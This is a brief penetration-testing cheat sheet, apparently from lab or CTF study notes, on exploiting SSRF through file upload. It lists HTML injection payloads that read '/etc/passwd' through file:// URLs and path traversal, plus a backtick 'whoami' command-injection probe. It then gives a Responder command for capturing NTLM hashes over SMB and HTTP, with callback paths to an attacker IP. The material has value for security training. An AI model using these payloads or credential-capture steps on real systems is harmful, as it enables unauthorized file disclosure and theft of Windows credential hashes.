# SSRF

If you have ssrf, via file upload maybe you can try these things to access files.

```bash
<iframe src="file:///etc/passwd" width="1000" height="2000"/>
<object data="./Process.php" width="300" height="200">
Placeholder Text
</object>
<embed type="text/html" src="../../../../../../../../../../etc/passwd" width="500" height="200"/>
        <p> hi `whoami`</p>
```

If you’re on a windows machine (especially AD), try to get NTLM hashes. Run responder

```bash
responder -i tun0 -vvv
```

You can get hashes through SMB and HTTP (I did it in Heist on OSPG)

```bash
//your_ip/test/
http://your_ip/
```